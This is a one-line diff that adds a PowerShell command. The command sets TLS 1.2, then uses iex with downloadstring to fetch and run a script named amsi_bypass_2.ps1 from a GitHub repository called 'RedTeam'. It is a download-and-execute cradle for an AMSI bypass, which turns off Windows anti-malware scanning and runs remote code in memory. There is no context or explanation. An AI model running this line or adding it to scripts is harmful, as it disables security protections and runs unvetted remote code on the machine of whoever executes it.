@@ -1,0 +1,1 @@
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/dottorvenom/RedTeam/main/amsi_bypass_2.ps1');
